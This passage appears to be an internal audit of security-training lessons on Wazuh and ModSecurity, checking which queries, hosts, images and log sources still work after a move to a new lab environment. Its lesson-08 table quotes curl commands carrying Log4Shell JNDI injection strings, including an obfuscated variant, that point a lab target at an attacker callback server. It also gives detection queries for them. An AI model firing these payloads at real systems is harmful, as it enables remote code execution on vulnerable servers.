| `http://dvwa.ccc.com/?q=%24%7Bjndi%3Aldap…%7D` -> 403 | p131 image, list (dvwa.xocrange.lab) | renamed (host); response unverified | whether Core's CRS 3.3.8 blocks a JNDI string in the User-Agent or `q` was not tested. Today's audit run of a `${jndi:` header got **302, no alert** (`docs/development/CONTENT-INFRA-AUDIT-2026-11-18.md`) |
| Second request (X-Api-Version obfuscated + UA rmi) -> 302 | p131 image, Q07-04 result | same expected | 302 -> no alert |
| "Wazuh 4.10 기본 룰셋에는 Log4Shell 전용 룰이 없다" -> only 31101 on the 403 line | p128, p137, Q07-03 result | same (version 4.14) | no jndi rule in Core `native-rules.xml` either |
| "juice 는 200 이라 레벨 0 → 인덱스에 안 남음", dvwa in blocking mode | p137 | changed | on Core **both** dvwa and juiceshop are behind the blocking WAF |
| Apache combined log records only UA and Referer | blind box | same | Core line has an extra `xoc_id=` suffix |
| WAF audit record holds request headers ("5.6의 방법") | Q07-03 result, blind box | renamed -> alerts, `location: *modsecurity`, `data.audit_data.*` | whether request headers are kept in Core's audit JSON for a non-blocked request is unverified (119670 "audit event" docs exist) |
| Firewall / DNS records for outbound connection to the callback address | p128, p130, p137, table row 4 | firewall: renamed -> `location: *nftables` (and `*suricata`); **DNS: missing** | no DNS container in Core |
| "Java 하위 프로세스·새 파일" follow-up | table | renamed -> `/sysmon`, `/auditd`, `/osquery` locations | host-level sensors, not per-container agents |
| `wazuh-archives-*` | Q07-04 | **missing in practice** | archives empty |
| Chrome "Network conditions" UA override | manuscript list | same | |
| `agent.name: "web"` | Q07-03, Q07-04 | renamed | |

**3. Command blocks.** None in the manuscript (browser only). Slide commands:

| Id | Where | Tool | Target | Runs in Core |
|---|---|---|---|---|
| p131a | attacker VM | curl -H 'User-Agent: ${jndi:ldap://192.168.0.202:1389/a}' | `http://dvwa.ccc.com/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.202%2Fa%7D` | needs rename (host, https, callback address) |
| p131b | attacker VM | curl -H 'X-Api-Version: ${${lower:j}ndi:ldap://…:1389/b}' -A '${jndi:rmi://…:1099/c}' | `http://dvwa.ccc.com/` | needs rename |

**4. Query blocks**

| Id | Index | Fields / rules | Returns data? |
|---|---|---|---|
| slide p133 | alerts | `full_log:*jndi* OR data.url:(*jndi* or *%24%7B* or *$\{*)` | fields exist; live 0 hits (no jndi request with a 4xx today). Returns data only if the WAF blocks the request — unverified on Core |
| Q07-03 | alerts | `agent.name`, `full_log: *jndi*`, `data.url: *jndi*` | after removing `agent.name`, and only if the request is blocked (unverified) |
| Q07-04 | archives | `agent.name`, `full_log: *jndi*`, `full_log: *lower*`, `data.url: *%24%7B*` | **no** — archives empty |

**5. Images.** 6 total. Slides 4 (1 terminal + 3 Discover). Manuscript 2: 1 `screens`, 1 diagram. Old-environment: 5; diagrams: 1.

**6. Blocking gaps.** (a) Archives empty — Q07-04 and the "obfuscated variant returned 302, find it in archives" step. (b) It is unverified that Core's WAF answers 403 to the plain JNDI request; if it answers 302 (as today's header test did) there is no alert and nothing to find anywhere. (c) No DNS log source for the outbound-callback check.

---

## Cross-lesson summary of gaps (ordered by lessons blocked)

| # | Gap | Lessons | Kind |
|---|---|---|---|
| 1 | `agent.name: "web"` in every manuscript query (16 queries) returns 0 on Core; needs removal or `location: *apache-access` | 01–08 (8) | rename, mechanical |
| 2 | Hostnames/addresses: `dvwa.ccc.com`, `dvwa.xocrange.lab`, 192.168.0.189, 192.168.0.202, plain HTTP:80 -> `dvwa.xoc.range`, HTTPS 443, Core/attacker addresses. Slide commands are baked into PNG images (12 attack-terminal images), not text | 01–08 (8) | rename + image regeneration |
| 3 | Old-environment imagery: 63 of 72 images (41 slide captures = 12 attacker-terminal + 29 Discover results showing `agent.name = web`; 22 manuscript `screens`); 9 diagrams reusable | 01–08 (8) | recapture |
| 4 | `wazuh-archives-*` has no documents on Core (logall_json is on, nothing indexed). Blocks Q06-04, Q06-07, Q06-08, Q07-04 and the archives fallbacks/teaching points | 05, 06, 08 hard; 03, 07 soft (5) | Core data gap |
| 5 | Attack tools missing on the attacker VM: sqlmap (01), dirb/gobuster/nikto (04), hydra (06); plus xfreerdp and the in-lab attack container on the 04 concept pages | 01, 04, 06 (3) | tool gap; curl loops can substitute except for the tool-fingerprint lessons |
| 6 | ModSecurity audit record shape: archives + `location: "/var/log/apache2/modsec_audit.log"` + `data.request.request_line` -> alerts + `location: *modsecurity` + `data.audit_data.*` (request line only in `full_log`) | 02 (prose), 05 (Q06-04), 08 (prose) (3) | rename + field missing |
| 7 | DVWA login state (admin/password, Low level) needed for the browser halves; unauthenticated baseline is 302 not 200 | 01, 02, 03, 05, 06 browser parts (unverified) | verify |
| 8 | FIM on the web root, Wazuh agent in the web container, VirusTotal integration, ClamAV, custom rule 100260/cmdlog, landing vhost, learner `docker exec` on the host | 07 (1, but fatal) | feature gap — lesson needs redesign |
| 9 | Unverified WAF behaviour for JNDI strings (today a `${jndi:` header got 302/no alert); no DNS logs | 08 (1) | verify / feature gap |
| 10 | Core-only rules change what learners see: 111303 (scanner UA) replaces 31101 on scanner-UA rows; 119670–119672 appear in any `full_log` search; ingress noise `172.18.0.1 /siem/…` inflates 31101 and POST/login searches | 04, 05, 06 | narrative update |

Image totals for the eight lessons: 72 images = 41 slide images (12 attacker-terminal + 29 Discover result captures, all old environment, no `path`) + 31 manuscript images (22 with `screens` in the path, 9 diagrams under `figures`). Old-environment: 63; reusable diagrams: 9.

Content errors found that are independent of the port: slide p54/p58 (case-01) present rule 31161 as "multiple SQLi attempts from the same IP"; on the Manager 31161 is "Multiple web server 501 error code" (the SQLi frequency rule is 31152). Slide wildcards on `data.url` are lower-case (`*union*`, `*select*`) while the payloads are upper-case; `data.url` is a case-sensitive keyword field (live: `*union*` 0 hits, `*UNION*` 2 hits). Case-07 terminal images and captions expose the internal code name `kt66` to learners.

Not verified in this audit (no request was sent, nothing inside containers was inspected): DVWA credentials and security level, file layout and tools inside `xoc-core-security-path-web-1`, CRS response to raw `../`, PROPFIND and JNDI payloads, `requests`/`nano` on the attacker VM, `xoc-events-*` (the helper's sort field failed on that index), and anything about the office network.
